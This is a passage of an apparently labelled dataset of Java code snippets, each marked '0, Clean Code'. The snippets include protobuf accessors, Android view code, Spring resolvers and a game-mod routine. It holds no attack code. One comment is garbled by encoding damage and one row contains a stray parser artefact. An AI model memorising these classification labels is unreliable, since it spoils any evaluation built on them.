 * @return a converter that maps between this enum's numeric and text representations
 */
public static ProtoEnum.EnumConverter<BattleEndStatus> converter(){
  return BattleEndStatusConverter.INSTANCE;
}
",0,Clean Code
"ArrayList<IGProRecommendRobotTextChannel> getRobotTextChannel();
",0,Clean Code
"private SyncDeleteFriendScNotify(){
}
",0,Clean Code
"@Nullable private <K>Object resolveArgument(MethodParameter parameter,Collection<K> keys,BatchLoaderEnvironment environment){
  parameter.initParameterNameDiscovery(this.parameterNameDiscoverer);
  Class<?> parameterType=parameter.getParameterType();
  if (Collection.class.isAssignableFrom(parameterType)) {
    if (parameterType.isInstance(keys)) {
      return keys;
    }
    Class<?> elementType=parameter.nested().getNestedParameterType();
    Collection<K> collection=CollectionFactory.createCollection(parameterType,elementType,keys.size());
    collection.addAll(keys);
    return collection;
  }
 else   if (parameter.hasParameterAnnotation(ContextValue.class)) {
    return resolveContextValueArgument(parameter,environment);
  }
 else   if (parameterType.equals(GraphQLContext.class)) {
    return environment.getContext();
  }
 else   if (parameterType.isInstance(environment)) {
    return environment;
  }
 else   if (""kotlin.coroutines.Continuation"".equals(parameterType.getName())) {
    return null;
  }
 else   if (springSecurityPresent && Principal.class.isAssignableFrom(parameter.getParameterType())) {
    return PrincipalMethodArgumentResolver.resolveAuthentication(parameter);
  }
 else {
    throw new IllegalStateException(formatArgumentError(parameter,""Unexpected argument type.""));
  }
}
",0,Clean Code
"public static void unset(){
  THREAD_LOCAL.remove();
}
",0,Clean Code
"public DefaultPropertyBodyNode(SourceSection sourceSection,Identifier propertyName,@Nullable PropertyTypeNode typeNode){
  super(sourceSection);
  this.propertyName=propertyName;
  this.typeNode=typeNode;
}
",0,Clean Code
"/** 
 * <code>optional uint32 from_uid = 11;</code>
 * @return this
 */
public RevcMsgScNotify clearFromUid(){
  bitField0_&=~0x00000004;
  fromUid=0;
  return this;
}",0,Clean Code
"public Class<?> getCurrentReadClass(){
  return currentReadClass;
}
",0,Clean Code
"IGProAVDevOptInfo getDevOpt();
",0,Clean Code
"@Override public ActionResult convert(BusinessException exception){
  return ActionResult.fail(exception.getCode(),I18nUtils.getMessage(exception.getCode(),exception.getArgs()),ExceptionUtils.getErrorInfoFromException(exception));
}",0,Clean Code
"@Override public SetClientPausedScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  paused=false;
  return this;
}",0,Clean Code
"@Override public boolean onKeyPreIme(int keyCode,@NonNull KeyEvent event){
  if (keyCode == KeyEvent.KEYCODE_BACK) {
    if (event.getAction() == KeyEvent.ACTION_DOWN && event.getRepeatCount() == 0) {
      KeyEvent.DispatcherState state=getKeyDispatcherState();
      if (state != null) {
        state.startTracking(event,this);
      }
      return true;
    }
 else     if (event.getAction() == KeyEvent.ACTION_UP) {
      KeyEvent.DispatcherState state=getKeyDispatcherState();
      if (state != null) {
        state.handleUpEvent(event);
      }
      if (event.isTracking() && !event.isCanceled()) {
        if (mListener != null) {
          mListener.onBackPressed();
          return true;
        }
      }
    }
  }
  return super.onKeyPreIme(keyCode,event);
}",0,Clean Code
"@GET(""models"") @Headers({""Content-Type: application/json""}) Call<MistralAiModelResponse> models();
",0,Clean Code
"@Override public void onSizeChanged(int height,boolean isWidthGreater){
  if (!isPremium) {
    return;
  }
  if (height > dp(50) && keyboardVisible && !AndroidUtilities.isInMultiwindow && !AndroidUtilities.isTablet()) {
    if (isWidthGreater) {
      keyboardHeightLand=height;
      MessagesController.getGlobalEmojiSettings().edit().putInt(""kbd_height_land3"",keyboardHeightLand).commit();
    }
 else {
      keyboardHeight=height;
      MessagesController.getGlobalEmojiSettings().edit().putInt(""kbd_height"",keyboardHeight).commit();
    }
  }
  if (emojiViewVisible) {
    int newHeight=(isWidthGreater ? keyboardHeightLand : keyboardHeight);
    FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)emojiView.getLayoutParams();
    if (layoutParams.width != AndroidUtilities.displaySize.x || layoutParams.height != newHeight) {
      layoutParams.width=AndroidUtilities.displaySize.x;
      layoutParams.height=newHeight;
      emojiView.setLayoutParams(layoutParams);
      emojiPadding=layoutParams.height;
      keyboardNotifier.fire();
      parentAlert.sizeNotifierFrameLayout.requestLayout();
    }
  }
  if (lastSizeChangeValue1 == height && lastSizeChangeValue2 == isWidthGreater) {
    return;
  }
  lastSizeChangeValue1=height;
  lastSizeChangeValue2=isWidthGreater;
  boolean oldValue=keyboardVisible;
  if (currentCell != null) {
    final EditTextBoldCursor editText=currentCell.getEditField();
    keyboardVisible=editText.isFocused() && keyboardNotifier.keyboardVisible() && height > 0;
  }
 else {
    keyboardVisible=false;
  }
  if (keyboardVisible && emojiViewVisible) {
    showEmojiPopup(0);
  }
  if (emojiPadding != 0 && !keyboardVisible && keyboardVisible != oldValue && !emojiViewVisible) {
    emojiPadding=0;
    keyboardNotifier.fire();
    parentAlert.sizeNotifierFrameLayout.requestLayout();
  }
  if (keyboardVisible && waitingForKeyboardOpen) {
    waitingForKeyboardOpen=false;
    AndroidUtilities.cancelRunOnUIThread(openKeyboardRunnable);
  }
}",0,Clean Code
"@Test public void testZrank(){
  jedisSentinel.zrank(""key"",""member"");
}
",0,Clean Code
"public DemoResponse(JSONObject json){
  this.json=json;
}
",0,Clean Code
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  if (!mDefaultsInitialized) {
    mDefaultTextSize=(int)getTextSize();
    mDefaultLineSpacingExtra=getLineSpacingExtra();
    mDefaultPaddingTop=getPaddingTop();
    mDefaultPaddingBottom=getPaddingBottom();
    mDefaultsInitialized=true;
  }
  setTextSize(TypedValue.COMPLEX_UNIT_PX,mDefaultTextSize);
  setLineSpacing(mDefaultLineSpacingExtra,getLineSpacingMultiplier());
  setPaddingTopAndBottom(mDefaultPaddingTop,mDefaultPaddingBottom);
  super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  boolean resizeText=false;
  final Layout layout=getLayout();
  if (layout != null) {
    if ((mTriggerConditions & TRIGGER_MAX_LINES) > 0) {
      final int lineCount=layout.getLineCount();
      final int maxLines=getMaxLines();
      if (maxLines > 1) {
        resizeText=lineCount == maxLines;
      }
    }
  }
  final int currentSizePx=(int)getTextSize();
  boolean remeasure=false;
  if (resizeText) {
    if (mResizedTextSize != -1 && currentSizePx != mResizedTextSize) {
      setTextSize(TypedValue.COMPLEX_UNIT_PX,mResizedTextSize);
      remeasure=true;
    }
    final float targetLineSpacingExtra=mDefaultLineSpacingExtra + mDefaultTextSize - mResizedTextSize;
    if (mMaintainLineSpacing && getLineSpacingExtra() != targetLineSpacingExtra) {
      setLineSpacing(targetLineSpacingExtra,getLineSpacingMultiplier());
      remeasure=true;
    }
    final int paddingTop=mDefaultPaddingTop + mResizedPaddingAdjustmentTop;
    final int paddingBottom=mDefaultPaddingBottom + mResizedPaddingAdjustmentBottom;
    if (getPaddingTop() != paddingTop || getPaddingBottom() != paddingBottom) {
      setPaddingTopAndBottom(paddingTop,paddingBottom);
      remeasure=true;
    }
  }
 else {
    if (mResizedTextSize != -1 && currentSizePx != mDefaultTextSize) {
      setTextSize(TypedValue.COMPLEX_UNIT_PX,mDefaultTextSize);
      remeasure=true;
    }
    if (mMaintainLineSpacing && getLineSpacingExtra() != mDefaultLineSpacingExtra) {
      setLineSpacing(mDefaultLineSpacingExtra,getLineSpacingMultiplier());
      remeasure=true;
    }
    if (getPaddingTop() != mDefaultPaddingTop || getPaddingBottom() != mDefaultPaddingBottom) {
      setPaddingTopAndBottom(mDefaultPaddingTop,mDefaultPaddingBottom);
      remeasure=true;
    }
  }
  mIsResized=resizeText;
  if (remeasure) {
    super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  }
}",0,Clean Code
"public SearchResult<TaskSummary> searchTasks(String query,String freeText,int start,int size,List<String> sortOptions){
  SearchResult<String> result=executionDAOFacade.searchTasks(query,freeText,start,size,sortOptions);
  List<TaskSummary> workflows=result.getResults().stream().parallel().map(task -> {
    try {
      return new TaskSummary(executionDAOFacade.getTask(task));
    }
 catch (    Exception e) {
      LOGGER.error(""Error fetching task by id: {}"",task,e);
      return null;
    }
  }
).filter(Objects::nonNull).collect(Collectors.toList());
  int missing=result.getResults().size() - workflows.size();
  long totalHits=result.getTotalHits() - missing;
  return new SearchResult<>(totalHits,workflows);
}
",0,Clean Code
"@SuppressLint(""NonConstantResourceId"") private static void merge(DownloadInfo[] arr,int left,int mid,int right,int sortType){
  DownloadInfo[] a=new DownloadInfo[right - left + 1];
  int i=left;
  int j=mid + 1;
  int k=0;
  while (i <= mid && j <= right) {
switch (sortType) {
case R.id.sort_by_gallery_id_asc:
      if (arr[i].gid < arr[j].gid) {
        a[k++]=arr[i++];
      }
 else {
        a[k++]=arr[j++];
      }
    break;
case R.id.sort_by_gallery_id_desc:
  if (arr[i].gid > arr[j].gid) {
    a[k++]=arr[i++];
  }
 else {
    a[k++]=arr[j++];
  }
break;
case R.id.sort_by_create_time_asc:
if (arr[i].time < arr[j].time) {
a[k++]=arr[i++];
}
 else {
a[k++]=arr[j++];
}
break;
case R.id.sort_by_create_time_desc:
if (arr[i].time > arr[j].time) {
a[k++]=arr[i++];
}
 else {
a[k++]=arr[j++];
}
break;
case R.id.sort_by_rating_asc:
if (arr[i].rating < arr[j].rating) {
a[k++]=arr[i++];
}
 else {
a[k++]=arr[j++];
}
break;
case R.id.sort_by_rating_desc:
if (arr[i].rating > arr[j].rating) {
a[k++]=arr[i++];
}
 else {
a[k++]=arr[j++];
}
break;
}
}
while (i <= mid) a[k++]=arr[i++];
while (j <= right) a[k++]=arr[j++];
for (i=0; i < k; i++) {
arr[left++]=a[i];
}
}",0,Clean Code
"/** 
 * @return factory for creating ItemCost messages
 */
public static MessageFactory<ItemCost> getFactory(){
  return ItemCostFactory.INSTANCE;
}
",0,Clean Code
"ArrayList<IGProFeedThumbnail> getFeedThumbnails();
",0,Clean Code
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  if (tiledLayout == null) {
    setMeasuredDimension(MeasureSpec.getSize(widthMeasureSpec),0);
    return;
  }
  int width=Math.min(V.dp(MAX_WIDTH),MeasureSpec.getSize(widthMeasureSpec));
  int height=Math.round(width * (tiledLayout.height / (float)PhotoLayoutHelper.MAX_WIDTH));
  if (tiledLayout.width < PhotoLayoutHelper.MAX_WIDTH) {
    width=Math.round(width * (tiledLayout.width / (float)PhotoLayoutHelper.MAX_WIDTH));
  }
  if (rowStarts == null || rowStarts.length < tiledLayout.rowSizes.length) {
    rowStarts=new int[tiledLayout.rowSizes.length];
    rowEnds=new int[tiledLayout.rowSizes.length];
  }
  if (columnStarts == null || columnStarts.length < tiledLayout.columnSizes.length) {
    columnStarts=new int[tiledLayout.columnSizes.length];
    columnEnds=new int[tiledLayout.columnSizes.length];
  }
  int offset=0;
  for (int i=0; i < tiledLayout.columnSizes.length; i++) {
    columnStarts[i]=offset;
    offset+=Math.round(tiledLayout.columnSizes[i] / (float)tiledLayout.width * width);
    columnEnds[i]=offset;
    offset+=V.dp(GAP);
  }
  columnEnds[tiledLayout.columnSizes.length - 1]=width;
  offset=0;
  for (int i=0; i < tiledLayout.rowSizes.length; i++) {
    rowStarts[i]=offset;
    offset+=Math.round(tiledLayout.rowSizes[i] / (float)tiledLayout.height * height);
    rowEnds[i]=offset;
    offset+=V.dp(GAP);
  }
  rowEnds[tiledLayout.rowSizes.length - 1]=height;
  for (int i=0; i < getChildCount(); i++) {
    View child=getChildAt(i);
    LayoutParams lp=(LayoutParams)child.getLayoutParams();
    int colSpan=Math.max(1,lp.tile.colSpan) - 1;
    int rowSpan=Math.max(1,lp.tile.rowSpan) - 1;
    int w=columnEnds[lp.tile.startCol + colSpan] - columnStarts[lp.tile.startCol];
    int h=rowEnds[lp.tile.startRow + rowSpan] - rowStarts[lp.tile.startRow];
    child.measure(w | MeasureSpec.EXACTLY,h | MeasureSpec.EXACTLY);
  }
  setMeasuredDimension(MeasureSpec.getSize(widthMeasureSpec),height);
}",0,Clean Code
"private TransformerListProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private TransformerListProto(){
  transformer_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@ac3ef08",0,Clean Code
"/** 
 * Write null tag for the obj if the obj is null, otherwise do nothing.
 * @param buffer data buffer for writing flag.
 * @param obj object.
 * @return true if no bytes need to be written for the object.
 */
boolean writeNullFlag(MemoryBuffer buffer,Object obj);
",0,Clean Code
"/** 
 * <code>optional uint32 talent_id = 1;</code>
 * @return the talentId
 */
public int getTalentId(){
  return talentId;
}",0,Clean Code
"public void setCheckBoxVisible(boolean visible,boolean animated){
  if (animated && currentMessageObject != null && currentMessageObject.deletedByThanos) {
    return;
  }
  if (visible) {
    quoteHighlight=null;
    if (checkBox == null) {
      checkBox=new CheckBoxBase(this,21,resourcesProvider);
      if (attachedToWindow) {
        checkBox.onAttachedToWindow();
      }
    }
 else {
      checkBox.setResourcesProvider(resourcesProvider);
    }
  }
  if (visible && ((currentMessagesGroup != null && currentMessagesGroup.messages.size() > 1) || (groupedMessagesToSet != null && groupedMessagesToSet.messages.size() > 1))) {
    if (mediaCheckBox == null) {
      mediaCheckBox=new CheckBoxBase(this,21,resourcesProvider);
      mediaCheckBox.setUseDefaultCheck(true);
      if (attachedToWindow) {
        mediaCheckBox.onAttachedToWindow();
      }
    }
 else {
      mediaCheckBox.setResourcesProvider(resourcesProvider);
    }
  }
  if (checkBoxVisible == visible) {
    if (animated != checkBoxAnimationInProgress && !animated) {
      checkBoxAnimationProgress=visible ? 1.0f : 0.0f;
      invalidate();
    }
    return;
  }
  checkBoxAnimationInProgress=animated;
  checkBoxVisible=visible;
  if (animated) {
    lastCheckBoxAnimationTime=SystemClock.elapsedRealtime();
  }
 else {
    checkBoxAnimationProgress=visible ? 1.0f : 0.0f;
  }
  invalidate();
}",0,Clean Code
"public RichTextEmojiContent getEmojiContent(){
  return this.emojiContent;
}
",0,Clean Code
"@Override public void setAge(Integer age){
  this.age=age;
}
",0,Clean Code
"private static Schema getSchemaForValue(Object value){
  if (value instanceof String) {
    return Schema.STRING_SCHEMA;
  }
 else   if (value instanceof Integer) {
    return Schema.INT32_SCHEMA;
  }
 else   if (value instanceof Long) {
    return Schema.INT64_SCHEMA;
  }
 else   if (value instanceof Double) {
    return Schema.FLOAT64_SCHEMA;
  }
 else   if (value instanceof Boolean) {
    return Schema.BOOLEAN_SCHEMA;
  }
 else   if (value instanceof Decimal128) {
    BigDecimal decimalValue=new BigDecimal(value.toString());
    return Decimal.schema(decimalValue.scale());
  }
 else   if (value instanceof Byte) {
    return Schema.BYTES_SCHEMA;
  }
 else   if (value instanceof Binary) {
    return Schema.BYTES_SCHEMA;
  }
 else   if (value instanceof Date) {
    return Timestamp.SCHEMA;
  }
 else   if (value instanceof BsonTimestamp) {
    return Schema.INT64_SCHEMA;
  }
 else {
    return Schema.STRING_SCHEMA;
  }
}",0,Clean Code
"void accept(int node,float score);
",0,Clean Code
"/** 
 * Creates a renderer for  {@link java.util.Properties} file format. If {@code omitNullProperties}is  {@code true}, object properties and map entries whose value is  {@code null} will not berendered. If  {@code restrictCharset} is {@code true} characters outside the printable US-ASCIIcharset range will be rendered as <a href=""https://docs.oracle.com/javase/specs/jls/se8/html/jls-3.html#jls-3.3"">Unicode escapes</a>.
 */
public static ValueRenderer properties(Writer writer,boolean omitNullProperties,boolean restrictCharset){
  return new PropertiesRenderer(writer,omitNullProperties,restrictCharset);
}",0,Clean Code
"private InteractChargerScRsp(){
}
",0,Clean Code
"@Override protected void doSolveBackward(DataflowAnalysis<Node,Fact> analysis,DataflowResult<Node,Fact> result){
  CFG<Node> cfg=analysis.getCFG();
  NavigableSet<Node> workList=Sets.newOrderedSet(Comparator.comparingInt(n -> -cfg.getIndex(n)));
  cfg.forEach(node -> {
    if (!cfg.isExit(node)) {
      workList.add(node);
    }
  }
);
  while (!workList.isEmpty()) {
    Node node=workList.pollFirst();
    Fact out;
    int outDegree=cfg.getOutDegreeOf(node);
    if (outDegree > 1) {
      out=result.getOutFact(node);
      cfg.getOutEdgesOf(node).forEach(outEdge -> {
        Fact fact=result.getInFact(outEdge.target());
        if (analysis.needTransferEdge(outEdge)) {
          fact=analysis.transferEdge(outEdge,fact);
        }
        analysis.meetInto(fact,out);
      }
);
    }
 else     if (outDegree == 1) {
      CFGEdge<Node> outEdge=CollectionUtils.getOne(cfg.getOutEdgesOf(node));
      if (analysis.needTransferEdge(outEdge)) {
        out=analysis.transferEdge(outEdge,result.getInFact(outEdge.target()));
        result.setOutFact(node,out);
      }
 else {
        out=result.getOutFact(node);
      }
    }
 else {
      out=result.getOutFact(node);
    }
    Fact in=result.getInFact(node);
    boolean changed=analysis.transferNode(node,in,out);
    if (changed) {
      workList.addAll(cfg.getPredsOf(node));
    }
  }
}",0,Clean Code
"private void placeCrystal(BlockHitResult result,double damage,BlockPos supportBlock){
  Item targetItem=supportBlock == null ? Items.END_CRYSTAL : Items.OBSIDIAN;
  FindItemResult item=InvUtils.findInHotbar(targetItem);
  if (!item.found())   return;
  int prevSlot=mc.player.getInventory().selectedSlot;
  if (autoSwitch.get() != AutoSwitchMode.None && !item.isOffhand())   InvUtils.swap(item.slot(),false);
  Hand hand=item.getHand();
  if (hand == null)   return;
  if (supportBlock == null) {
    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(hand,result,0));
    if (swingMode.get().client())     mc.player.swingHand(hand);
    if (swingMode.get().packet())     mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(hand));
    placing=true;
    placingTimer=4;
    kaTimer=8;
    placingCrystalBlockPos.set(result.getBlockPos()).move(0,1,0);
    placeRenderPos.set(result.getBlockPos());
    renderDamage=damage;
    if (renderMode.get() == RenderMode.Normal) {
      placeRenderTimer=placeRenderTime.get();
    }
 else {
      placeRenderTimer=renderTime.get();
      if (renderMode.get() == RenderMode.Fading) {
        RenderUtils.renderTickingBlock(placeRenderPos,sideColor.get(),lineColor.get(),shapeMode.get(),0,renderTime.get(),true,false);
      }
    }
  }
 else {
    BlockUtils.place(supportBlock,item,false,0,swingMode.get().client(),true,false);
    placeTimer+=supportDelay.get();
    if (supportDelay.get() == 0)     placeCrystal(result,damage,null);
  }
  if (autoSwitch.get() == AutoSwitchMode.Silent)   InvUtils.swap(prevSlot,false);
}",0,Clean Code
"/** 
 * 鑾峰彇鐢ㄦ埛淇℃伅
 * @return 鐢ㄦ埛淇℃伅
 */
@GetMapping(value=""getInfo"",name=""鑾峰彇鐢ㄦ埛淇℃伅"") public R getInfo(){
  SysUserEntity user=SecurityUtils.getLoginUser().getUser();
  Set<String> roles=permissionService.getRolePermission(user);
  Set<String> permissions=permissionService.getMenuPermission(user);
  R ajax=R.ok();
  ajax.put(""user"",user);
  ajax.put(""roles"",roles);
  ajax.put(""permissions"",permissions);
  return ajax;
}
",0,Clean Code
"private void updateViews(){
  if (m_graph.getSettings().getLayoutSettings().getAutomaticLayouting() && m_doLayout) {
    m_graph.doLayout();
  }
  m_graph.updateViews();
}
",0,Clean Code
"@Test public void testLogLevelInfoOutput() throws Exception {
{
    Utils.setValueInConfig(""log_level"",""INFO"");
    String[] args={""../""};
    TestingProcess process=TestingProcessManager.start(args);
    assertNotNull(process.checkOrWaitForEvent(PROCESS_STATE.STARTED));
    File infoLog=new File(Config.getConfig(process.getProcess()).getInfoLogPath(process.getProcess()));
    File errorLog=new File(Config.getConfig(process.getProcess()).getErrorLogPath(process.getProcess()));
    boolean errorOutput=false;
    boolean warnOutput=false;
    boolean infoOutput=false;
    boolean debugOutput=false;
    Logging.error(process.getProcess(),TenantIdentifier.BASE_TENANT,""some error"",false);
    Logging.warn(process.getProcess(),TenantIdentifier.BASE_TENANT,""some warn"");
    Logging.info(process.getProcess(),TenantIdentifier.BASE_TENANT,""some info"",true);
    Logging.debug(process.getProcess(),TenantIdentifier.BASE_TENANT,""some debug"");
    try (Scanner scanner=new Scanner(infoLog,StandardCharsets.UTF_8)){
      while (scanner.hasNextLine()) {
        String line=scanner.nextLine();
        if (line.contains(process.getProcess().getProcessId())) {
          if (line.contains(""some info"")) {
            infoOutput=true;
          }
 else           if (line.contains(""some debug"")) {
            debugOutput=true;
          }
        }
      }
    }
     try (Scanner errorScanner=new Scanner(errorLog,StandardCharsets.UTF_8)){
      while (errorScanner.hasNextLine()) {
        String line=errorScanner.nextLine();
        if (line.contains(process.getProcess().getProcessId())) {
          if (line.contains(""some error"")) {
            errorOutput=true;
          }
 else           if (line.contains(""some warn"")) {
            warnOutput=true;
          }
        }
      }
    }
     assertTrue(errorOutput && warnOutput && infoOutput&& !debugOutput);
    process.kill();
    assertNotNull(process.checkOrWaitForEvent(PROCESS_STATE.STOPPED));
  }
}",0,Clean Code
"/** 
 * Don't call this method directly.
 */
public static void innerDestroy(){
  if (Objects.nonNull(serviceSdkContext)) {
    try {
      if (Objects.nonNull(providerAPI)) {
        ((AutoCloseable)providerAPI).close();
        providerAPI=null;
      }
      if (Objects.nonNull(losslessAPI)) {
        ((AutoCloseable)losslessAPI).close();
        losslessAPI=null;
      }
      if (Objects.nonNull(consumerAPI)) {
        ((AutoCloseable)consumerAPI).close();
        consumerAPI=null;
      }
      if (Objects.nonNull(routerAPI)) {
        ((Destroyable)routerAPI).destroy();
        routerAPI=null;
      }
      if (Objects.nonNull(circuitBreakAPI)) {
        ((Destroyable)circuitBreakAPI).destroy();
        circuitBreakAPI=null;
      }
      if (Objects.nonNull(limitAPI)) {
        ((AutoCloseable)limitAPI).close();
        limitAPI=null;
      }
      if (Objects.nonNull(assemblyAPI)) {
        ((Destroyable)assemblyAPI).destroy();
        assemblyAPI=null;
      }
      if (Objects.nonNull(serviceSdkContext)) {
        serviceSdkContext.destroy();
        serviceSdkContext=null;
      }
      LOG.info(""Polaris SDK context is destroyed."");
    }
 catch (    Throwable throwable) {
      LOG.error(""destroy Polaris SDK context failed."",throwable);
    }
  }
}
",0,Clean Code
"@Override public BattleTargetList clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  battleTargetList.clearQuick();
  return this;
}",0,Clean Code
"@Override public boolean drawEdges(){
  if (!(m_minEdgesForSloppyEdgeHiding < getGraph2D().E())) {
    return true;
  }
  return !(m_sloppyEdgeHidingThreshold > getZoom());
}",0,Clean Code
"public GraphPanel getCombinedGraphPanel(){
  return combinedViewPanel.getGraphPanel();
}
",0,Clean Code
"public GProChannelPresenceItemInfo(){
  this.text="""";
  this.jumpUrl="""";
}
public GProChannelPresenceItemInfo(String str,String str2,int i2){
  this.text="""";
  this.jumpUrl="""";
  this.text=str;
  this.jumpUrl=str2;
  this.jumpType=i2;
}",0,Clean Code
"/** 
 * Subscribe jit notify callback to be invoked after target jit finished. 
 */
public void registerJITNotifyCallback(Object id,NotifyCallback notifyCallback){
  Preconditions.checkNotNull(id);
  try {
    lock();
    List<NotifyCallback> notifyCallbacks=hasJITResult.get(id);
    if (notifyCallbacks == null) {
      notifyCallback.onNotifyMissed();
    }
 else {
      notifyCallbacks.add(notifyCallback);
    }
  }
  finally {
    unlock();
  }
}
",0,Clean Code
"public abstract void visit(MariaDBConstant c);
public abstract void visit(MariaDBPostfixUnaryOperation op);
public abstract void visit(MariaDBColumnName c);
public abstract void visit(MariaDBSelectStatement s);
public abstract void visit(MariaDBText t);
public abstract void visit(MariaDBAggregate aggr);
public abstract void visit(MariaDBBinaryOperator comp);
public abstract void visit(MariaDBUnaryPrefixOperation op);
public abstract void visit(MariaDBFunction func);
public abstract void visit(MariaDBInOperation op);
public abstract void visit(MariaDBJoin join);
public abstract void visit(MariaDBTableReference join);
public void visit(MariaDBExpression expr){
  if (expr instanceof MariaDBConstant) {
    visit((MariaDBConstant)expr);
  }
 else   if (expr instanceof MariaDBColumnName) {
    visit((MariaDBColumnName)expr);
  }
 else   if (expr instanceof MariaDBSelectStatement) {
    visit((MariaDBSelectStatement)expr);
  }
 else   if (expr instanceof MariaDBPostfixUnaryOperation) {
    visit((MariaDBPostfixUnaryOperation)expr);
  }
 else   if (expr instanceof MariaDBText) {
    visit((MariaDBText)expr);
  }
 else   if (expr instanceof MariaDBAggregate) {
    visit((MariaDBAggregate)expr);
  }
 else   if (expr instanceof MariaDBBinaryOperator) {
    visit((MariaDBBinaryOperator)expr);
  }
 else   if (expr instanceof MariaDBUnaryPrefixOperation) {
    visit((MariaDBUnaryPrefixOperation)expr);
  }
 else   if (expr instanceof MariaDBFunction) {
    visit((MariaDBFunction)expr);
  }
 else   if (expr instanceof MariaDBInOperation) {
    visit((MariaDBInOperation)expr);
  }
 else   if (expr instanceof MariaDBJoin) {
    visit((MariaDBJoin)expr);
  }
 else   if (expr instanceof MariaDBTableReference) {
    visit((MariaDBTableReference)expr);
  }
 else {
    throw new AssertionError(expr.getClass());
  }
}
",0,Clean Code
"/** 
 * <code>repeated string para_list = 1;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableParaList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedString getParaList(){
  return paraList;
}",0,Clean Code
"@Override public Collection<Object> values(){
  return delegate.values();
}
",0,Clean Code
"/** 
 * <code>optional uint32 roll_shop_id = 13;</code>
 * @return whether the rollShopId field is set
 */
public boolean hasRollShopId(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"@Override public void resetWrite(){
  IdentityObjectIntMap<Object> writtenObjects=this.writtenObjects;
  long writeTotalObjectSize=this.writeTotalObjectSize + writtenObjects.size;
  long writeCounter=this.writeCounter + 1;
  if (writeCounter < 0 || writeTotalObjectSize < 0) {
    writeCounter=1;
    writeTotalObjectSize=writtenObjects.size;
  }
  this.writeCounter=writeCounter;
  this.writeTotalObjectSize=writeTotalObjectSize;
  int avg=(int)(writeTotalObjectSize / writeCounter);
  if (avg <= DEFAULT_MAP_CAPACITY) {
    avg=DEFAULT_MAP_CAPACITY;
  }
  writtenObjects.clearApproximate(avg);
}",0,Clean Code
"public static CharSequence createActionTextWithTopic(TLRPC.TL_forumTopic topic,MessageObject messageObject){
  if (topic == null) {
    return null;
  }
  if (messageObject.messageOwner.action instanceof TLRPC.TL_messageActionTopicCreate) {
    return AndroidUtilities.replaceCharSequence(""%s"",LocaleController.getString(R.string.TopicWasCreatedAction),ForumUtilities.getTopicSpannedName(topic,null,false));
  }
  if (messageObject.messageOwner.action instanceof TLRPC.TL_messageActionTopicEdit) {
    TLRPC.TL_messageActionTopicEdit topicEdit=(TLRPC.TL_messageActionTopicEdit)messageObject.messageOwner.action;
    long fromId=messageObject.getFromChatId();
    TLRPC.User fromUser=null;
    TLRPC.Chat fromChat=null;
    if (DialogObject.isUserDialog(fromId)) {
      fromUser=MessagesController.getInstance(messageObject.currentAccount).getUser(fromId);
    }
 else {
      fromChat=MessagesController.getInstance(messageObject.currentAccount).getChat(-fromId);
    }
    String name=null;
    if (fromUser != null) {
      name=ContactsController.formatName(fromUser.first_name,fromUser.last_name);
    }
 else     if (fromChat != null) {
      name=fromChat.title;
    }
    if ((topicEdit.flags & 8) != 0) {
      return AndroidUtilities.replaceCharSequence(""%s"",topicEdit.hidden ? LocaleController.getString(R.string.TopicHidden2) : LocaleController.getString(R.string.TopicShown2),name);
    }
    if ((topicEdit.flags & 4) != 0) {
      CharSequence charSequence=AndroidUtilities.replaceCharSequence(""%2$s"",topicEdit.closed ? LocaleController.getString(R.string.TopicWasClosedAction) : LocaleController.getString(R.string.TopicWasReopenedAction),ForumUtilities.getTopicSpannedName(topic,null,false));
      return AndroidUtilities.replaceCharSequence(""%1$s"",charSequence,name);
    }
    if ((topicEdit.flags & 1) != 0 && (topicEdit.flags & 2) != 0) {
      TLRPC.TL_forumTopic forumTopic=new TLRPC.TL_forumTopic();
      forumTopic.icon_emoji_id=topicEdit.icon_emoji_id;
      forumTopic.title=topicEdit.title;
      CharSequence charSequence=AndroidUtilities.replaceCharSequence(""%2$s"",LocaleController.getString(R.string.TopicWasRenamedToAction2),ForumUtilities.getTopicSpannedName(forumTopic,null,false));
      return AndroidUtilities.replaceCharSequence(""%1$s"",charSequence,name);
    }
    if ((topicEdit.flags & 1) != 0) {
      CharSequence charSequence=AndroidUtilities.replaceCharSequence(""%2$s"",LocaleController.getString(R.string.TopicWasRenamedToAction),topicEdit.title);
      return AndroidUtilities.replaceCharSequence(""%1$s"",charSequence,name);
    }
    if ((topicEdit.flags & 2) != 0) {
      TLRPC.TL_forumTopic forumTopic=new TLRPC.TL_forumTopic();
      forumTopic.icon_emoji_id=topicEdit.icon_emoji_id;
      forumTopic.title="""";
      CharSequence charSequence=AndroidUtilities.replaceCharSequence(""%2$s"",LocaleController.getString(R.string.TopicWasIconChangedToAction),ForumUtilities.getTopicSpannedName(forumTopic,null,false));
      return AndroidUtilities.replaceCharSequence(""%1$s"",charSequence,name);
    }
  }
  return null;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=2;
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * avatarList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(avatarList);
  }
  return size;
}",0,Clean Code
"public static int getLockApp(Context context){
  try {
    return Settings.Global.getInt(context.getContentResolver(),""key_lock_app"");
  }
 catch (  Settings.SettingNotFoundException e) {
    logE(""LockApp"",""getInt hyceiler_lock_app will set E: "" + e);
  }
  return -1;
}",0,Clean Code
"@Override public List<Function> functions(Connection connection,String databaseName,String schemaName){
